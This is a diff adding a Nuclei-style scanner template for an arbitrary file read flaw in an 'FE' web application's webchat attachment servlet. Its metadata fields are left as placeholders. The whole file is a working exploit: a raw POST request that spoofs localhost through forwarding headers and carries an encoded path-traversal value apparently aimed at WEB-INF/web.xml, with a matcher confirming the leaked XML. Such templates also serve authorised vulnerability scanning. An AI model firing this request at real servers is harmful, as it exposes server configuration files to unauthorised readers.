@@ -1,0 +1,23 @@
+id: FE-fileread
+info:
+  name: FE-fileread
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - "POST /servlet/webchat/attachment/1 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent:\
+        \ Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0\n\
+        Content-Length: 164\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection:\
+        \ close\nContent-Type: application/x-www-form-urlencoded\nX-Forwarded-For:\
+        \ 127.0.0.1 \nX-Originating-IP: 127.0.0.1 \nX-Remote-Addr: 127.0.0.1 \nX-Remote-IP:\
+        \ 127.0.0.1\n\nmailAttachment=1&attachPK=%2Fv8AMQAJAC8ACQAvAAkALwAJAC8ALg\
+        \ AuAC8ALgAuAC8ALgAuAC8AagBiAG8AcwBzAC8AdwBlAGIALwBmAGUAL gB3AGEAcgAvAFcARQBCAC0ASQBOAEYALwB3AGUAYgAuAHgAbQBs"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
